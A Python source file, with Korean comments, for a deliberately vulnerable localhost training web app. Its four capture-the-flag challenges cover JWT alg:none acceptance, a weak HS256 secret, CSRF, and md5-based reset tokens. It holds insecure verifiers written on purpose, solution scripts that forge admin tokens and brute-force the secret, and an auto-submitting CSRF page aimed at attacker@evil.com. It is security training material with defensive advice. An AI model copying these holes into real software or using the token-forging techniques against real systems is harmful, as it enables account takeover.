#!/usr/bin/env python3
"""
3단계 취약 웹앱 (중상급, 교육용, localhost 전용).

1단계(hack1)가 '무방비', 2단계(hack2)가 '허술한 방어의 우회'였다면,
3단계는 '인증/세션' 자체의 설계 결함을 다룹니다.

경고: 고의로 취약. 127.0.0.1 에서 학습용으로만.
의존성 없음. 실행: python vuln_app.py  →  http://127.0.0.1:8002

포함 챌린지:
  1. JWT alg:none 우회 — 서명 없는 토큰을 그대로 신뢰
  2. JWT 약한 서명(HS256) — 짧은 사전 단어 SECRET을 무차별 대입으로 복원
  3. CSRF — 상태 변경 엔드포인트에 토큰/Origin 검증이 없음
  4. 예측 가능한 비밀번호 재설정 토큰 — md5(username)으로 토큰을 직접 계산
"""

import base64
import hashlib
import hmac
import html
import json
import os
import sqlite3
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln3.db")
HOST, PORT = "127.0.0.1", 8002

# 챌린지 1용: 서명 자체는 강한 비밀로 걸지만, 검증기가 alg:none 도 받아준다 (취약).
JWT_SECRET = "S0m3_R4nd0m_S3rver_Secret_2026"
# 챌린지 2용: 서명 방식(HS256)은 정상이지만 SECRET이 짧은 사전 단어라 무차별 대입에 뚫린다.
WEAK_JWT_SECRET = "key"


# --------------------------------------------------------------------------
# DB 준비
# --------------------------------------------------------------------------
def init_db():
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT)")
    cur.executemany(
        "INSERT INTO users (username, password, email) VALUES (?,?,?)",
        [
            ("admin", "AdminPass!2026", "admin@corp.local"),
            ("alice", "password123", "alice@example.com"),
            ("bob", "qwerty", "bob@example.com"),
        ],
    )
    con.commit()
    con.close()


def db():
    return sqlite3.connect(DB_PATH)


def get_user(username):
    con = db()
    row = con.execute("SELECT username, password, email FROM users WHERE username=?", (username,)).fetchone()
    con.close()
    return row


# --------------------------------------------------------------------------
# 미니 JWT 구현 (표준 라이브러리만 사용: base64 + hmac + hashlib)
# --------------------------------------------------------------------------
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_encode(header: dict, payload: dict, secret: str | None):
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    signing_input = f"{h}.{p}".encode()
    if header.get("alg") == "none":
        sig = ""
    else:
        sig = b64url_encode(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def jwt_decode_unsafe(token):
    """서명 검증 없이 구조만 파싱 (디버깅/검증용 내부 헬퍼)."""
    try:
        h, p, s = token.strip().split(".")
        header = json.loads(b64url_decode(h))
        payload = json.loads(b64url_decode(p))
        return header, payload, s
    except Exception:
        return None


def verify_jwt(token, secret, allow_none):
    """취약한 검증기: allow_none=True 이면 alg:none 토큰을 서명 확인 없이 통과시킨다."""
    parsed = jwt_decode_unsafe(token)
    if not parsed:
        return None
    header, payload, sig = parsed
    alg = header.get("alg", "")
    if alg == "none":
        if allow_none:
            # 취약: 서명이 비어 있어도 그냥 payload를 신뢰한다.
            return payload
        return None
    if alg == "HS256":
        h, p, _ = token.split(".")
        expected = b64url_encode(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
        if hmac.compare_digest(expected, sig):
            return payload
    return None


# --------------------------------------------------------------------------
CSS = """
<style>
  body{font-family:system-ui,Segoe UI,Arial,sans-serif;max-width:900px;margin:0 auto;
       padding:1rem;background:#12101a;color:#e6e6e6;line-height:1.5}
  a{color:#c792ea} h1,h2{color:#fff}
  nav{display:flex;gap:.6rem;flex-wrap:wrap;padding:.75rem 0;border-bottom:1px solid #333;margin-bottom:1rem}
  nav a{padding:.3rem .6rem;background:#1e1a2b;border-radius:6px;text-decoration:none}
  .card{background:#191527;border:1px solid #2f2a42;border-radius:10px;padding:1rem;margin:1rem 0}
  .hint{background:#241a30;border-left:3px solid #b06ad0;padding:.6rem .9rem;margin:.6rem 0;border-radius:4px}
  .flag{color:#7ee787;font-weight:bold}
  input,textarea{background:#12101a;color:#e6e6e6;border:1px solid #3f3a52;border-radius:6px;
                 padding:.45rem;font-size:1rem;width:100%;max-width:520px;box-sizing:border-box}
  button{background:#8a3ffc;color:#fff;border:0;border-radius:6px;padding:.5rem 1rem;
         font-size:1rem;cursor:pointer;margin-top:.5rem}
  code,pre{background:#0c0a12;padding:.15rem .35rem;border-radius:4px;color:#ffa3e0;word-break:break-all}
  pre{padding:.8rem;overflow:auto;display:block;white-space:pre-wrap}
  .warn{background:#3a1414;border:1px solid #7a2222;padding:.6rem;border-radius:8px;color:#ffb4b4}
  details summary{cursor:pointer;color:#b06ad0}
  label{display:block;margin:.5rem 0 .2rem}
  .lvl{font-size:.8rem;background:#2a1a3a;color:#c9a6ff;padding:.1rem .5rem;border-radius:10px}
</style>
"""

NAV = """
<nav>
  <a href="/">🏠 홈</a>
  <a href="/jwt_none">1. JWT alg:none</a>
  <a href="/jwt_weak">2. JWT 약한 서명</a>
  <a href="/csrf">3. CSRF</a>
  <a href="/reset">4. 재설정 토큰 예측</a>
</nav>
"""


def page(title, body):
    return f"""<!doctype html><html lang="ko"><head><meta charset="utf-8">
<title>{title}</title>{CSS}</head><body>{NAV}{body}</body></html>""".encode("utf-8")


def view_home():
    body = """
    <h1>🔑 3단계 취약 웹앱 <span class="lvl">중상급</span></h1>
    <div class="warn">고의로 취약. 127.0.0.1 학습 전용. 외부 노출 금지.</div>
    <p>이번 단계는 <b>인증/세션</b>을 다룹니다. 로그인 자체는 잘 되지만,
    "이 토큰/요청이 정말 유효한가"를 검증하는 방식에 구멍이 있습니다.</p>
    <div class="card">
      <h2>이 단계에서 새로 배우는 것</h2>
      <ul>
        <li><b>JWT alg:none</b> — 검증기가 "서명 없음"이라는 알고리즘까지 신뢰</li>
        <li><b>JWT 약한 서명</b> — 알고리즘은 정상이어도 SECRET이 짧으면 오프라인 무차별 대입에 뚫림</li>
        <li><b>CSRF</b> — 로그인된 상태에서도, 요청이 "진짜 사용자의 의도"인지 확인 안 함</li>
        <li><b>예측 가능한 토큰</b> — 재설정 토큰이 랜덤이 아니라 계산 가능한 값이면 소용없음</li>
      </ul>
    </div>
    <div class="card"><b>목표 FLAG 4개:</b> 각 챌린지 페이지에서 admin으로 위장하거나
    admin의 계정을 장악해 FLAG를 얻으세요.</div>
    """
    return page("3단계 취약 웹앱", body)


# 1) JWT alg:none 우회 -------------------------------------------------------
def view_jwt_none(params):
    demo_token = jwt_encode({"alg": "HS256", "typ": "JWT"}, {"user": "alice", "role": "user"}, JWT_SECRET)
    token = params.get("token", [""])[0]
    result = ""
    if token:
        # 취약: allow_none=True → alg:none 토큰을 서명 검증 없이 그대로 신뢰한다.
        payload = verify_jwt(token, JWT_SECRET, allow_none=True)
        if payload is None:
            result = '<div class="warn">❌ 유효하지 않은 토큰입니다.</div>'
        else:
            user = payload.get("user", "")
            flag = ""
            if user == "admin":
                flag = '<p class="flag">🎉 FLAG{jwt_alg_none_bypass} — alg:none 위조로 admin이 되었습니다!</p>'
            result = f'<div class="card">✅ 인증된 신원: <b>{html.escape(str(user))}</b>{flag}</div>'
    body = f"""
    <h1>1. JWT alg:none 우회</h1>
    <p>정상 로그인(alice) 토큰 예시(HS256, 서버 SECRET으로 서명됨):</p>
    <pre>{demo_token}</pre>
    <div class="card">
      <form method="get">
        <label>검사할 토큰 (아래 칸에 위조 토큰을 넣으세요)</label>
        <input name="token" value="{html.escape(token)}" placeholder="header.payload.signature">
        <button>검사</button>
      </form>
      {result}
    </div>
    <p><b>🎯 목표:</b> SECRET을 몰라도, <code>user: admin</code> 신원을 서버가 신뢰하게 만드세요.</p>
    <div class="hint">💡 힌트 1: JWT는 <code>base64url(header).base64url(payload).서명</code> 3부분입니다.
      header를 <code>{{"alg":"none","typ":"JWT"}}</code>로 바꾸면 서명이 필요 없어질 수도 있습니다.</div>
    <div class="hint">💡 힌트 2: <code>alg:none</code>은 원래 "서명 검증을 건너뛴다"는 뜻의 합법적인 JWT
      스펙 값입니다. 검증기가 이걸 여전히 받아준다면, 서명 부분을 아예 비워도 통과합니다.</div>
    <div class="hint">💡 힌트 3: Python 표준 라이브러리(<code>base64</code>, <code>json</code>)만으로
      토큰을 직접 조립할 수 있습니다.</div>
    <details><summary>정답 보기</summary>
      <pre>import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
h = b64({{"alg":"none","typ":"JWT"}})
p = b64({{"user":"admin","role":"admin"}})
token = f"{{h}}.{{p}}."   # 서명 자리를 비워둔다
print(token)</pre>
      <p>이 토큰을 위 칸에 넣으면 <span class="flag">FLAG{{jwt_alg_none_bypass}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 검증 시 <code>alg</code>를 서버가 화이트리스트로 강제하세요
      (클라이언트가 보낸 alg를 절대 신뢰하지 마세요). <code>alg:none</code>은 별도 옵트인 없이는 거부해야 합니다.</div>
    """
    return page("JWT alg:none", body)


# 2) JWT 약한 서명(HS256) 무차별 대입 -----------------------------------------
def view_jwt_weak(params):
    demo_token = jwt_encode({"alg": "HS256", "typ": "JWT"}, {"user": "alice", "role": "user"}, WEAK_JWT_SECRET)
    token = params.get("token", [""])[0]
    result = ""
    if token:
        # 이 엔드포인트는 alg:none을 허용하지 않는다 — SECRET을 실제로 알아내야 한다.
        payload = verify_jwt(token, WEAK_JWT_SECRET, allow_none=False)
        if payload is None:
            result = '<div class="warn">❌ 유효하지 않은 토큰입니다 (alg:none은 여기선 안 통합니다).</div>'
        else:
            user = payload.get("user", "")
            flag = ""
            if user == "admin":
                flag = '<p class="flag">🎉 FLAG{jwt_weak_secret} — 약한 SECRET을 무차별 대입으로 알아냈습니다!</p>'
            result = f'<div class="card">✅ 인증된 신원: <b>{html.escape(str(user))}</b>{flag}</div>'
    body = f"""
    <h1>2. JWT 약한 서명(HS256) 무차별 대입</h1>
    <p>정상 로그인(alice) 토큰 예시 (이번엔 alg:none이 막혀 있습니다):</p>
    <pre>{demo_token}</pre>
    <div class="card">
      <form method="get">
        <label>검사할 토큰</label>
        <input name="token" value="{html.escape(token)}" placeholder="header.payload.signature">
        <button>검사</button>
      </form>
      {result}
    </div>
    <p><b>🎯 목표:</b> HS256 서명의 SECRET을 오프라인으로 알아낸 뒤, <code>user: admin</code> 토큰을 직접 서명하세요.</p>
    <div class="hint">💡 힌트 1: HS256 서명 = <code>HMAC-SHA256(header.payload, SECRET)</code>. SECRET만 알면
      누구든 유효한 서명을 만들 수 있습니다.</div>
    <div class="hint">💡 힌트 2: SECRET은 짧은 사전 단어입니다. 흔한 단어 목록으로
      alice 토큰의 서명을 다시 계산해보며 일치하는 것을 찾으세요 (사전 대입 공격).</div>
    <div class="hint">💡 힌트 3: SECRET을 알아냈으면, 같은 방식으로 <code>{{"user":"admin"}}</code> payload를
      직접 서명해 새 토큰을 만드세요.</div>
    <details><summary>정답(파이썬) 보기</summary>
      <pre>import base64, json, hmac, hashlib

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")

h = b64({{"alg":"HS256","typ":"JWT"}})
p = b64({{"user":"alice","role":"user"}})
signing_input = f"{{h}}.{{p}}".encode()
target_sig = "{demo_token.split('.')[2]}"

wordlist = ["123456","password","secret","admin","key","qwerty","letmein","test"]
found = None
for word in wordlist:
    sig = base64.urlsafe_b64encode(
        hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
    ).decode().rstrip("=")
    if sig == target_sig:
        found = word
        break
print("SECRET =", found)  # -> "key"

# SECRET을 알았으니 admin 토큰을 직접 서명한다
p2 = b64({{"user":"admin","role":"admin"}})
sig2 = base64.urlsafe_b64encode(
    hmac.new(found.encode(), f"{{h}}.{{p2}}".encode(), hashlib.sha256).digest()
).decode().rstrip("=")
print(f"{{h}}.{{p2}}.{{sig2}}")</pre>
      <p>출력된 토큰을 위 칸에 넣으면 <span class="flag">FLAG{{jwt_weak_secret}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> HMAC SECRET은 최소 32바이트 이상의 무작위 값을 쓰고,
      비밀 관리 시스템에 보관하세요. 사전 단어·짧은 문자열은 절대 사용하지 마세요.</div>
    """
    return page("JWT 약한 서명", body)


# 3) CSRF ---------------------------------------------------------------------
def view_csrf():
    row = get_user("alice")
    email = row[2] if row else ""
    flag = ""
    if email.endswith("@evil.com"):
        flag = '<p class="flag">🎉 FLAG{csrf_no_token} — 토큰/Origin 검증 없이 이메일이 강제로 변경되었습니다!</p>'
    body = f"""
    <h1>3. CSRF — 토큰 없는 상태 변경</h1>
    <p>당신은 지금 <b>alice</b>로 로그인했다고 가정합니다. 현재 이메일: <code>{html.escape(email)}</code></p>
    {flag}
    <div class="card">
      <h2>정상 사용 — 내 이메일 변경</h2>
      <form method="post" action="/csrf/change">
        <label>새 이메일</label>
        <input name="email" placeholder="alice@example.com">
        <button>변경</button>
      </form>
      <p>이 폼에는 CSRF 토큰도, <code>Origin</code>/<code>Referer</code> 검사도 없습니다.</p>
    </div>
    <div class="card">
      <h2>🕷️ 공격 시연</h2>
      <p>alice가 로그인된 채로 다른 탭에서 아래 "악성 페이지"를 열면 무슨 일이 벌어질까요?</p>
      <p><a href="/csrf/evil">▶ 악성 페이지 열기 (자동으로 이메일을 attacker@evil.com 으로 바꿉니다)</a></p>
    </div>
    <p><b>🎯 목표:</b> alice가 스스로 누르지 않은 요청으로 alice의 이메일이 바뀌게 만드세요.</p>
    <div class="hint">💡 힌트 1: <code>/csrf/change</code>는 POST로 오는 <code>email</code> 값을 그대로 반영합니다.
      이 요청이 alice의 진짜 의도였는지 서버는 전혀 확인하지 않습니다.</div>
    <div class="hint">💡 힌트 2: HTML 폼은 다른 사이트(다른 origin)에서도 임의의 URL로 자동 제출될 수 있습니다.
      <code>&lt;form action="..." method="post"&gt;</code> + <code>onload</code>로 자동 submit.</div>
    <details><summary>정답 보기</summary>
      <p>"악성 페이지 열기"를 누르면 <code>/csrf/evil</code>이 로드되자마자 숨겨진 폼을
      <code>/csrf/change</code>로 자동 제출해 이메일을 <code>attacker@evil.com</code>으로 바꿉니다.
      이 페이지로 돌아오면 <span class="flag">FLAG{{csrf_no_token}}</span>가 보입니다.</p>
      <p>실제 공격에서는 이 페이지가 완전히 다른 도메인(공격자 사이트)에 있어도, 브라우저는
      alice의 세션 쿠키를 자동으로 함께 보내기 때문에 동일하게 동작합니다.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 상태 변경 요청마다 예측 불가능한 <b>CSRF 토큰</b>을 발급해 검증하고,
      <code>SameSite=Strict/Lax</code> 쿠키와 <code>Origin</code>/<code>Referer</code> 검사를 함께 쓰세요.</div>
    """
    return page("CSRF", body)


def view_csrf_evil():
    # 취약점을 "시연"하기 위한 공격자 페이지 — 페이지가 열리자마자 자동으로
    # /csrf/change 에 email=attacker@evil.com 을 아무 토큰 없이 제출한다.
    body = """
    <h1>🕷️ 가짜 이벤트 페이지</h1>
    <p>무료 쿠폰을 받으려면 잠시만 기다려주세요...</p>
    <form id="evil" action="/csrf/change" method="post">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.getElementById('evil').submit();</script>
    <p><a href="/csrf">← CSRF 챌린지로 돌아가기</a></p>
    """
    return page("악성 페이지", body)


def view_csrf_change(body_params):
    new_email = body_params.get("email", [""])[0]
    if new_email:
        con = db()
        con.execute("UPDATE users SET email=? WHERE username='alice'", (new_email,))
        con.commit()
        con.close()
    body = f"""
    <h1>이메일이 변경되었습니다</h1>
    <p>새 이메일: <code>{html.escape(new_email)}</code></p>
    <p><a href="/csrf">← CSRF 챌린지로 돌아가기</a></p>
    """
    return page("이메일 변경됨", body)


# 4) 예측 가능한 비밀번호 재설정 토큰 -----------------------------------------
def reset_token_for(username):
    # 취약: 재설정 토큰이 무작위가 아니라 사용자명의 md5 해시일 뿐 → 누구나 계산 가능.
    return hashlib.md5(username.encode()).hexdigest()


def view_reset(method, params, body_params):
    requested = ""
    result = ""
    if method == "POST":
        requested = body_params.get("username", [""])[0]
    else:
        requested = params.get("username", [""])[0]
    if requested:
        token = reset_token_for(requested)
        if requested == "admin":
            # 취약점을 넘어서기 위한 최소한의 현실성: 남의 받은편지함(admin) 내용은 안 보여준다.
            result = f"""<div class="card">📧 재설정 링크를 <code>{html.escape(requested)}</code>의
            이메일로 발송했습니다. (그 계정 소유자만 받은편지함에서 볼 수 있습니다)</div>"""
        else:
            link = f"/reset/confirm?username={urllib.parse.quote(requested)}&token={token}"
            result = f"""<div class="card">📧 재설정 링크를 발송했습니다 (데모 편의상 여기 표시):<br>
            <code>{html.escape(link)}</code></div>"""
    body = f"""
    <h1>4. 예측 가능한 비밀번호 재설정 토큰</h1>
    <div class="card">
      <form method="post">
        <label>재설정할 계정</label>
        <input name="username" value="{html.escape(requested)}" placeholder="alice">
        <button>재설정 이메일 요청</button>
      </form>
      {result}
    </div>
    <p><b>🎯 목표:</b> admin의 받은편지함 없이도, admin의 비밀번호를 재설정하세요.</p>
    <div class="hint">💡 힌트 1: alice로 요청해서 나온 링크의 <code>token</code> 값을 자세히 보세요.
      정말 무작위처럼 보이나요?</div>
    <div class="hint">💡 힌트 2: 토큰은 <code>md5(username)</code>입니다. alice의 토큰을
      <code>md5("alice")</code>와 비교해보세요.</div>
    <div class="hint">💡 힌트 3: 알고리즘을 알았다면, admin의 받은편지함을 볼 필요 없이
      <code>md5("admin")</code>을 직접 계산해 <code>/reset/confirm</code>에 넣으면 됩니다.</div>
    <details><summary>정답(파이썬) 보기</summary>
      <pre>import hashlib
token = hashlib.md5("admin".encode()).hexdigest()
print(token)
# -> /reset/confirm?username=admin&amp;token=<위 값>  으로 이동해 새 비밀번호를 지정</pre>
      <p>새 비밀번호를 지정하고 나면 <span class="flag">FLAG{{predictable_reset_token}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 재설정 토큰은 <code>secrets.token_urlsafe()</code> 같은
      암호학적 난수로 생성하고, 서버에 (해시로) 저장해 1회용·짧은 만료시간으로 검증하세요.</div>
    """
    return page("재설정 토큰 예측", body)


def view_reset_confirm(method, params, body_params):
    if method == "POST":
        username = body_params.get("username", [""])[0]
        token = body_params.get("token", [""])[0]
        new_password = body_params.get("new_password", [""])[0]
    else:
        username = params.get("username", [""])[0]
        token = params.get("token", [""])[0]
        new_password = ""

    result = ""
    if method == "POST" and username and token:
        expected = reset_token_for(username)
        if hmac.compare_digest(expected, token) and new_password:
            con = db()
            con.execute("UPDATE users SET password=? WHERE username=?", (new_password, username))
            con.commit()
            con.close()
            flag = ""
            if username == "admin":
                flag = '<p class="flag">🎉 FLAG{predictable_reset_token} — admin 비밀번호를 장악했습니다!</p>'
            result = f'<div class="card">✅ {html.escape(username)}의 비밀번호가 변경되었습니다.{flag}</div>'
        else:
            result = '<div class="warn">❌ 토큰이 올바르지 않습니다.</div>'

    body = f"""
    <h1>비밀번호 재설정</h1>
    <div class="card">
      <form method="post">
        <label>계정</label><input name="username" value="{html.escape(username)}">
        <label>토큰</label><input name="token" value="{html.escape(token)}">
        <label>새 비밀번호</label><input name="new_password" type="text">
        <button>재설정</button>
      </form>
      {result}
    </div>
    <p><a href="/reset">← 재설정 요청으로 돌아가기</a></p>
    """
    return page("비밀번호 재설정", body)


# --------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def _send(self, content, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _route(self, method):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)
        body_params = {}
        if method == "POST":
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            body_params = urllib.parse.parse_qs(raw)

        if path == "/":
            self._send(view_home())
        elif path == "/jwt_none":
            self._send(view_jwt_none(params))
        elif path == "/jwt_weak":
            self._send(view_jwt_weak(params))
        elif path == "/csrf":
            self._send(view_csrf())
        elif path == "/csrf/evil":
            self._send(view_csrf_evil())
        elif path == "/csrf/change" and method == "POST":
            self._send(view_csrf_change(body_params))
        elif path == "/reset":
            self._send(view_reset(method, params, body_params))
        elif path == "/reset/confirm":
            self._send(view_reset_confirm(method, params, body_params))
        else:
            self._send(page("404", "<h1>404 Not Found</h1>"), status=404)

    def do_GET(self):
        self._route("GET")

    def do_POST(self):
        self._route("POST")

    def log_message(self, fmt, *args):
        print("[req]", self.address_string(), fmt % args)


def main():
    init_db()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"3단계 취약 웹앱 실행 중 → http://{HOST}:{PORT}  (Ctrl+C 로 종료)")
    print("경고: localhost 전용. 외부에 노출하지 마세요.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n종료합니다.")
        server.shutdown()


if __name__ == "__main__":
    main()
